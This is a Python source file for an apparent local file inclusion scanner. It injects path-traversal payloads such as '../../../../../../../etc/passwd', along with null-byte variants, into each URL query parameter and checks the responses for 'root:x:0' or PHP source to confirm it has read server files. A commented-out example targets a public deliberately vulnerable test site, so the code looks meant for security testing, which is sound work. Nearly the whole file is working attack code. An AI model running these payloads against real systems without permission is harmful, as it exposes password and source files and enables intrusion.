import urllib.parse
import validators
from urllib.parse import urlparse, parse_qs
import requests


class LFI:
    payloads = ["showimage.php", "../../../../../../../etc/passwd"]
    high_strings = ["root:x:0", "root:x:0", "<?php"]
    LFI_Vulns = []

    def __init__(self, url, cookies=None):
        self.url = url
        self.cookies = cookies

    def check_url(self):
        return validators.url(self.url)

    def set_url(self, new_url):
        self.url = new_url
    """Lets see if url has a query string parameters or not"""

    def contain_params(self):
        if self.check_url():
            parsed_url = urlparse(self.url)
            query = parsed_url.query
            parameters = parse_qs(query)
            if bool(parameters) is False and parameters is not None:
                return False
            else:
                return True
                # return {k:v[0] if v and len(v) == 1 else v for k,v in parameters.items()}

    def mod_query(self):
        null_byte_list = []
        scheme = urlparse(self.url)
        common_ext = ["php", "html", "js", "jpg", "jpeg", "png", "css"]
        query = scheme.query
        # get two parameters at a row
        parameters = parse_qs(query)
        for parameter in parameters:
            endpoints = parameters[parameter]
            for endpoint in endpoints:
                if len(endpoint.split(".")) > 1:
                    extension = endpoint.split(".")[1]
                    if extension in common_ext:
                        for P in LFI.payloads:
                            new_param = P + "%00" + "." + extension
                            null_byte_list.append(new_param)
        return null_byte_list

    def add_null_byte(self,null_Bytes):
        scheme = urlparse(self.url)
        parameters = parse_qs(scheme.query)
        for parameter in parameters:
            for byte in null_Bytes:
                current_val = parameters[parameter]
                parameters[parameter] = byte
                new_parts = list(scheme)
                new_parts[4] = urllib.parse.urlencode(parameters)
                build_query = urllib.parse.urlunparse(new_parts)
                final_url = urllib.parse.unquote(build_query)
                request = requests.get(final_url)
                for highString in LFI.high_strings:
                    if highString in request.text:
                        LFI.LFI_Vulns.append({byte:parameters[parameter]})
                        print("LFI Found at {} with {} payload".format(self.url, byte))
                    else:
                        if type(current_val) == list:
                            parameters[parameter] = current_val[0]
                        else:
                            parameters[parameter] = current_val


    def check_LFI(self, is_param):
        if is_param is not False:
            parsed_url = urlparse(self.url)
            parameters = parse_qs(parsed_url.query)
            for parameter in parameters:
                for P in LFI.payloads:
                    current_value = parameters[parameter]
                    parameters[parameter] = P
                    new_parts = list(parsed_url)
                    new_parts[4] = urllib.parse.urlencode(parameters)
                    build_url = urllib.parse.urlunparse(new_parts)
                    data = requests.get(build_url).text

                    for high_string in LFI.high_strings:
                        if high_string in data:
                            #print("[+] LFI Found with the payload {} on {} parameter".format(P, parameter))
                            LFI.LFI_Vulns.append({P: self.url})
                            print("LFI Found at {} with {} payload".format(self.url, P))
                    parameters[parameter] = current_value
        else:
            print("This link has no parameters to interact... ")

    def main(self):
        if self.contain_params():
            self.check_LFI(is_param=True)
            null_list = self.mod_query()
            self.add_null_byte(null_list)




"""if __name__ == '__main__':
    scanner = LFI("http://testphp.vulnweb.com/showimage.php?file=showimage.php&wayback=test")
    checker = scanner.contain_params()
    #print(scanner.check_LFI(checker))
    list_of_something = scanner.mod_query()
    scanner.add_null_byte(list_of_something)"""
